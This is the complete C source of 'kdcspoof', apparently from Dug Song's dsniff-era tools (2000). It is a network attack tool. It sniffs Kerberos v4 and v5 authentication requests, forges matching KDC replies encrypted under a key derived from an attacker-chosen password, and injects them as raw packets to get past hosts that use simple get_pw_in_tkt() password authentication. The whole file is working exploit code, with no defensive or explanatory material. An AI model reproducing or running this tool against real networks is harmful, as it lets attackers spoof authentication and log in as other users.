/*
  kdcspoof.c

  Spoof Kerberos v4 AUTH_MSG_KDC_REPLY, Kerberos v5 KRB_AS_REP messages
  to bypass simple get_pw_in_tkt() password authentication.

  Copyright (c) 2000 Dug Song <dugsong@monkey.org>
  
  $Id: kdcspoof.c,v 1.5 2000/08/14 16:49:01 dugsong Exp $
*/

#include <sys/param.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <err.h>
#include <krb5.h>
#define _PORT_SOCKET_H		/* XXX - libnet conflict */
#include <krb.h>
#include <libnet.h>
#include <pcap.h>
#include <pcap-int.h>

#define KRB5_ETYPE		ETYPE_DES_CBC_MD5

/* XXX - from <prot.h> */
#define AUTH_MSG_KDC_REQUEST	2

/* XXX - from <krb-protos.h> */
extern KTEXT create_auth_reply();
extern int create_ciph();
extern int krb_get_int();
extern int des_new_random_key();

int		 Opt_v4 = 0;
int		 Opt_v5 = 0;
int		 Opt_afs = 0;

pcap_t		*pcap_pd = NULL;
int		 lnet_sock = -1;

char		*username;
char		*userrealm;

krb5_context	 context;
krb5_data	 empty;
krb5_principal	 princ;
krb5_keyblock	 key;
krb5_salt	 salt;

void
usage(void)
{
	fprintf(stderr, "Usage: kdcspoof [-i interface] -4|5|A "
		"user@REALM password \n");
	exit(1);
}

#ifdef BSD
int
bpf_immediate(int fd, int on)
{
	return (ioctl(fd, BIOCIMMEDIATE, &on));
}
#endif

pcap_t *
pcap_init(char *dev, char *filter, int snaplen)
{
	pcap_t *pd;
	u_int net, mask;
	struct bpf_program fcode;
	char ebuf[PCAP_ERRBUF_SIZE];
	
	if ((pd = pcap_open_live(dev, snaplen, 1, 512, ebuf)) == NULL)
		return (NULL);
	
	if (pcap_lookupnet(dev, &net, &mask, ebuf) < 0)
		return (NULL);
	
	if (pcap_compile(pd, &fcode, filter, 1, mask) < 0)
		return (NULL);
	
	if (pcap_setfilter(pd, &fcode) < 0)
		return (NULL);
#ifdef BSD
	if (bpf_immediate(pd->fd, 1) < 0)
		return (NULL);
#endif
	return (pd);
}

krb5_data *
krb4_as_rep(u_char *p)
{
	static krb5_data reply;
	KTEXT_ST *r, tkt, ciph;
	int pvno, type, lsb, life;
	char *cname, *sname, *inst, *sinst, *realm;
	des_cblock session;
	u_int32_t req_time;
	
	pvno = *p++;
	if (pvno != 4)
		return (NULL);
	
	type = *p++;
	lsb = type & 1;
	type &= ~1;
	
	if (type != AUTH_MSG_KDC_REQUEST)
		return (NULL);
	
	cname = p; p += strlen(cname) + 1;
	inst = p; p += strlen(inst) + 1;
	realm = p; p += strlen(realm) + 1;
	
	if (strcmp(username, cname) != 0)
		return (NULL);
	
	p += krb_get_int(p, &req_time, 4, lsb);
	life = *p++;
	
	sname = p; p += strlen(sname) + 1;
	sinst = p; p += strlen(sinst) + 1;
	
	des_new_random_key(&session);
	
	tkt.length = strlcpy(tkt.dat, "quis custodiet ipsos custodes",
			     sizeof(tkt.dat));
	
	create_ciph(&ciph, session, sname, sinst, realm, life, 3,
		    &tkt, req_time, key.keyvalue.data);
	
	warnx("krb4 AS REQ %s@%s for %s.%s", cname, realm, sname, sinst);
	
	r = create_auth_reply(cname, inst, realm, req_time, 0,
			      req_time + life, pvno, &ciph);
	
	krb5_data_copy(&reply, r->dat, r->length);
	
	return (&reply);
}

krb5_data *
krb5_as_rep(KDC_REQ *req)
{
	static krb5_data reply;
	KDC_REQ_BODY *b;
	AS_REP rep;
	EncTicketPart et;
	EncKDCRepPart ek;
	krb5_principal cprinc, sprinc;
	krb5_crypto crypto;
	char *cname, *sname;
	struct timeval now;
	size_t len;
	u_char buf[2048];

	gettimeofday(&now, NULL);

	b = &req->req_body;
	
	if (b->sname == NULL || b->cname == NULL)
		return (NULL);

	principalname2krb5_principal(&sprinc, *(b->sname), b->realm);
	principalname2krb5_principal(&cprinc, *(b->cname), b->realm);

	krb5_unparse_name(context, sprinc, &sname);
	krb5_unparse_name(context, cprinc, &cname);
	
	if (strcasecmp(cname, userrealm) != 0)
		return (NULL);
	
	warnx("krb5 AS REQ %s for %s", cname, sname);
	
	memset(&et, 0, sizeof(et));
	memset(&ek, 0, sizeof(ek));
	memset(&rep, 0, sizeof(rep));

	rep.pvno = 5;
	rep.msg_type = krb_as_rep;
	copy_Realm(&b->realm, &rep.crealm);
	copy_PrincipalName(b->cname, &rep.cname);
	rep.ticket.tkt_vno = 5;
	copy_Realm(&b->realm, &rep.ticket.realm);
	copy_PrincipalName(b->sname, &rep.ticket.sname);

	et.flags.initial = 1;
	krb5_generate_random_keyblock(context, KRB5_ETYPE, &et.key);
	copy_PrincipalName(b->cname, &et.cname);
	copy_Realm(&b->realm, &et.crealm);
	et.authtime = now.tv_sec;
	et.endtime = now.tv_sec + 31337;
	et.transited.tr_type = DOMAIN_X500_COMPRESS;
	et.transited.contents = empty;
	
	copy_EncryptionKey(&et.key, &ek.key);
	ek.last_req.val = calloc(2 * sizeof(*ek.last_req.val), 1);
	ek.last_req.len = 1;
	ek.nonce = b->nonce;
	ek.key_expiration = NULL;
	ek.flags = et.flags;
	ek.authtime = et.authtime;
	ek.endtime = et.endtime;
	copy_Realm(&rep.ticket.realm, &ek.srealm);
	copy_PrincipalName(&rep.ticket.sname, &ek.sname);

	encode_EncTicketPart(buf + sizeof(buf) - 1, sizeof(buf), &et, &len);
	krb5_crypto_init(context, &key, KRB5_ETYPE, &crypto);
	krb5_encrypt_EncryptedData(context, crypto, KRB5_KU_TICKET,
				   buf + sizeof(buf) - len, len, 3,
				   &rep.ticket.enc_part);
	krb5_crypto_destroy(context, crypto);

	encode_EncASRepPart(buf + sizeof(buf) - 1, sizeof(buf), &ek, &len);
	krb5_crypto_init(context, &key, 0, &crypto);
	krb5_encrypt_EncryptedData(context, crypto, KRB5_KU_AS_REP_ENC_PART,
				   buf + sizeof(buf) - len, len, 3,
				   &rep.enc_part);

	encode_AS_REP(buf + sizeof(buf) - 1, sizeof(buf), &rep, &len);
	krb5_crypto_destroy(context, crypto);
	
	krb5_data_copy(&reply, buf + sizeof(buf) - len, len);
	
	free_EncTicketPart(&et);
	free_EncKDCRepPart(&ek);
	free_AS_REP(&rep);
	krb5_free_principal(context, cprinc);
	krb5_free_principal(context, sprinc);
	free(cname);
	free(sname);

	return (&reply);
}

void
kdc_spoof(u_char *u, const struct pcap_pkthdr *pkthdr, const u_char *pkt)
{
	KDC_REQ req;
	krb5_data *reply;
	struct ip *ip;
	struct udphdr *udp;
	u_char *p, buf[1024];
	int len, i;

	ip = (struct ip *)(pkt + ETH_H);
	udp = (struct udphdr *)(pkt + ETH_H + (ip->ip_hl * 4));
	p = (u_char *)(udp + 1);
	len = ntohs(udp->uh_ulen) - UDP_H;
	reply = NULL;

	if (decode_AS_REQ(p, len, &req, &i) == 0) {
		reply = krb5_as_rep(&req);
		free_AS_REQ(&req);
	}
	else if (len > 0 && *p == 4) {
		reply = krb4_as_rep(p);
	}

	if (reply == NULL)
		return;
	
	libnet_build_ip(UDP_H + reply->length, 0, libnet_get_prand(PRu16),
			0, 64, IPPROTO_UDP,
			ip->ip_dst.s_addr, ip->ip_src.s_addr,
			NULL, 0, buf);
	
	libnet_build_udp(ntohs(udp->uh_dport), ntohs(udp->uh_sport),
			 reply->data, reply->length, buf + IP_H);
	
	libnet_do_checksum(buf, IPPROTO_UDP, UDP_H + reply->length);
	
	if (libnet_write_ip(lnet_sock, buf, IP_H + UDP_H + reply->length) < 0)
		warn("write");
}

void
lowercase(char *p)
{
	while (*p) {
		if (isupper(*p))
			*p = tolower(*p);
		p++;
	}
}

void
cleanup(int sig)
{
	libnet_close_raw_sock(lnet_sock);
	pcap_close(pcap_pd);
	exit(0);
}

int
main(int argc, char *argv[])
{
	int i;
	char *dev, buf[1024];
	char *password, *cell;

	dev = NULL;
	
	while ((i = getopt(argc, argv, "45Ai:h?")) != -1) {
		switch (i) {
		case '4':
			Opt_v4 = 1;
			break;
		case '5':
			Opt_v5 = 1;
			break;
		case 'A':
			Opt_afs = 1;
			break;
		case 'i':
			dev = optarg;
			break;
		default:
			usage();
			break;
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc != 2)
		usage();
	
	if (dev == NULL && (dev = pcap_lookupdev(buf)) == NULL)
		errx(1, "%s", buf);
	
	userrealm = argv[0];
	password = argv[1];

	username = strdup(userrealm);
	strtok(username, "@");
	cell = strtok(NULL, "@");
	lowercase(cell);
	
	krb5_init_context(&context);
	krb5_data_zero(&empty);
	
	if (Opt_v4) {
		salt.salttype = KRB5_PW_SALT;
		salt.saltvalue.length = 0;
		salt.saltvalue.data = NULL;
		krb5_string_to_key_salt(context, KRB5_ETYPE,
					password, salt, &key);
	}
	else if (Opt_v5) {
		krb5_parse_name(context, userrealm, &princ);
		krb5_get_pw_salt(context, princ, &salt);
	}
	else if (Opt_afs) {
		salt.salttype = KRB5_AFS3_SALT;
		salt.saltvalue.length = strlen(cell);
		salt.saltvalue.data = cell;
	}
	else usage();
	
	krb5_string_to_key_salt(context, KRB5_ETYPE, password, salt, &key);
	
	strlcpy(buf, "udp dst port 750 or dst port 88", sizeof(buf));
	
	if ((pcap_pd = pcap_init(dev, buf, 2000)) == NULL)
		errx(1, "couldn't initialize sniffing");
	
	if ((lnet_sock = libnet_open_raw_sock(IPPROTO_RAW)) == -1)
		errx(1, "couldn't initialize sending");
	
	libnet_seed_prand();
	
	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);
	
	pcap_loop(pcap_pd, -1, kdc_spoof, NULL);

	/* NOTREACHED */

	exit(0);
}
